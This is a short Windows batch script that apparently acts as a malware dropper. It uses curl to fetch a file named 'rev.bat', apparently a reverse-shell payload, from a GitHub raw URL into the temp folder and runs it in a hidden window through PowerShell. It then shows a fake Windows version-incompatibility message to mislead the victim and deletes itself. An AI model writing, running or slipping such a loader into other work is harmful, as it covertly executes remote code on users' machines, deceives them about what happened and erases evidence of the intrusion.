@echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.bat -o "%temp%\rev.bat"
powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
timeout /t 3 >nul
del "%~f0"
